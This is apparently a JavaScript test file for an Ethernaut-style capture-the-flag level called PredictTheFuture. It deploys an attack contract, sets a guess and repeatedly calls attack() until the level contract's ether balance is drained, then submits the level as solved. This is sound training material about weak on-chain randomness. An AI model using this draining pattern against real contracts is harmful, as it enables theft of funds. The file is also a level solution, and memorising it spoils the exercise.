const PredictTheFutureFactory = artifacts.require('./levels/PredictTheFutureFactory.sol');
const PredictTheFuture = artifacts.require('./levels/PredictTheFuture.sol');
const PredictTheFutureAttack = artifacts.require('../../contracts/attacks/PredictTheFutureAttack.sol');
const utils = require('../utils/TestUtils');
const { ethers } = require('hardhat');

contract('PredictTheFuture', function (accounts) {
    let ethernaut;
    let level;
    let instance;
    let player = accounts[0];
  
    before(async function () {
        ethernaut = await utils.getEthernautWithStatsProxy();
        level = await PredictTheFutureFactory.new();
        await ethernaut.registerLevel(level.address);
        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            player,
            PredictTheFuture,
            { from: player, value: web3.utils.toWei('0.01', 'ether') }
        );
    });

    it("solves the level", async function () {
        const attacker = await PredictTheFutureAttack.new(instance.address);

        await attacker.setGuess(7, {
            value: ethers.utils.parseEther('0.01'),
        });
        await ethers.provider.send("evm_mine");

        const sleep = (ms) =>
            new Promise((resolve) => setTimeout(resolve, ms));

        while(await ethers.provider.getBalance(instance.address) != 0) {
            try {
                await attacker.attack();
            } catch (error) {
                console.log(`attack failed with ${error.message}`)
            }
        }

        instanceBalance = await utils.getBalance(web3, instance.address);
        assert.equal(instanceBalance, 0);

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        );
          assert.equal(completed, true);
    });
});
